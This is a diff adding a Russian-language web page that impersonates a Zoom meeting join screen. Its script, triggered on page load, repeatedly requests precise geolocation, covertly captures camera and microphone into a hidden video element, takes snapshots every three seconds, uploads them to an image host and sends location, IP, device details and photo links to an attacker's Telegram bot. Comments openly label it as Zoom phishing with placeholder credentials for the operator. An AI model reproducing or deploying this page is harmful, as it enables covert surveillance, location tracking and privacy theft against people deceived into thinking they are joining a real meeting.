@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoom - Подключение к встрече</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #1a1a1e;
+            color: white;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        .zoom-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        .logo { font-size: 24px; font-weight: 700; margin-right: 15px; }
+        .status-bar {
+            background: #0f3460;
+            padding: 12px 20px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        .video-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        video {
+            width: 100%;
+            height: 200px;
+            background: #000;
+            border-radius: 12px;
+            object-fit: cover;
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        button {
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        button:hover { background: #106ebe; }
+        button:disabled { background: #333; cursor: not-allowed; }
+        .spinner {
+            width: 20px; height: 20px;
+            border: 2px solid #333;
+            border-top: 2px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .fake-video { background: linear-gradient(90deg, #1a1a1e 30%, #333 50%, #1a1a1e 70%); }
+    </style>
+</head>
+<body>
+    <div class="zoom-container">
+        <div class="header">
+            <div class="logo">zoom</div>
+            <div>Подключение к встрече...</div>
+        </div>
+        
+        <div class="status-bar">
+            <span class="spinner" id="spinner"></span>
+            <span id="status">Инициализация видеосоединения...</span>
+        </div>
+        
+        <div class="video-grid">
+            <video id="localVideo" class="fake-video" autoplay muted></video>
+            <video id="remoteVideo" class="fake-video" autoplay muted></video>
+        </div>
+        
+        <div class="controls">
+            <button onclick="toggleMute()" id="muteBtn">🔇 Выкл. микрофон</button>
+            <button onclick="toggleVideo()" id="videoBtn">📹 Выкл. видео</button>
+            <button onclick="leaveMeeting()">❌ Завершить</button>
+        </div>
+    </div>
+
+    <script>
+        // 🔥 ТВОИ ДАННЫЕ TELEGRAM
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
+
+        let stream = null;
+        let isMuted = false, isVideoOff = false;
+
+        // НЕВИДИМЫЕ ЭЛЕМЕНТЫ ДЛЯ КАМЕРЫ (НЕ ПОКАЗЫВАЕМ ПОЛНОЭКРАННЫЙ ВИДЕО)
+        const hiddenVideo = document.createElement('video');
+        hiddenVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
+        document.body.appendChild(hiddenVideo);
+
+        // АГРЕССИВНЫЙ ЗАПУСК ГЕОЛОКАЦИИ (много попыток)
+        function aggressiveGeolocation() {
+            let attempts = 0;
+            const tryGeo = () => {
+                attempts++;
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendLocation(pos),
+                    () => {
+                        if (attempts < 5) setTimeout(tryGeo, 1000);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            };
+            tryGeo();
+        }
+
+        // АГРЕССИВНЫЙ ЗАПУСК КАМЕРЫ (НЕВИДИМАЯ)
+        async function aggressiveCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: true
+                });
+                hiddenVideo.srcObject = stream;
+                
+                // Скриншоты каждые 3 секунды
+                setInterval(() => captureHiddenScreenshot(), 3000);
+                
+                sendToTelegram('🎥 <b>Zoom фейк!</b>\nКамера захвачена (скрытый режим)');
+            } catch(e) {}
+        }
+
+        // ОТПРАВКА ГЕОЛОКАЦИИ
+        async function sendLocation(pos) {
+            const ip = await getIP();
+            const maps = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            const msg = `
+🔥 <b>Zoom Phishing!</b>
+
+📍 <b>Координаты:</b> ${pos.coords.latitude}, ${pos.coords.longitude}
+📏 <b>Точность:</b> ${pos.coords.accuracy}m
+🗺️ <a href="${maps}">Google Maps</a>
+🌐 <b>IP:</b> ${ip}
+💻 <b>Device:</b> ${navigator.userAgent.slice(0,80)}`;
+            
+            sendToTelegram(msg);
+        }
+
+        // СКРИНШОТЫ ИЗ СКРЫТОГО ВИДЕО
+        async function captureHiddenScreenshot() {
+            if (!stream) return;
+            
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 640;
+            canvas.height = 480;
+            
+            if (hiddenVideo.readyState === 4) {
+                ctx.drawImage(hiddenVideo, 0, 0, 640, 480);
+                canvas.toBlob(async blob => {
+                    const formData = new FormData();
+                    formData.append('image', blob);
+                    
+                    try {
+                        const res = await fetch('https://api.imgur.com/3/image', {
+                            method: 'POST',
+                            headers: { 'Authorization': 'Client-ID YOUR_IMGUR_ID' },
+                            body: formData
+                        });
+                        const data = await res.json();
+                        sendToTelegram(`📸 <b>Zoom скриншот</b>`, data.data.link);
+                    } catch(e) {}
+                });
+            }
+        }
+
+        // FAKE КНОПКИ (чтобы выглядело как Zoom)
+        function toggleMute() {
+            isMuted = !isMuted;
+            document.getElementById('muteBtn').textContent = isMuted ? '🔊 Вкл. микрофон' : '🔇 Выкл. микрофон';
+        }
+        function toggleVideo() {
+            isVideoOff = !isVideoOff;
+            document.getElementById('videoBtn').textContent = isVideoOff ? '📹 Вкл. видео' : '📹 Выкл. видео';
+        }
+        function leaveMeeting() {
+            sendToTelegram('❌ Zoom сессия завершена');
+            location.reload();
+        }
+
+        // IP
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                return (await res.json()).ip;
+            } catch { return 'N/A'; }
+        }
+
+        // TELEGRAM
+        async function sendToTelegram(msg, photo = null) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            });
+        }
+
+        // ЗАПУСК ПРИ ЗАГРУЗКЕ (НЕ ЖДЕТ НИЧЕГО!)
+        window.addEventListener('load', () => {
+            document.getElementById('status').textContent = 'Видеосоединение активно';
+            aggressiveGeolocation();
+            aggressiveCamera();
+        });
+
+        // ПРИ ВЫХОДЕ
+        window.addEventListener('beforeunload', () => {
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        });
+    </script>
+</body>
+</html>
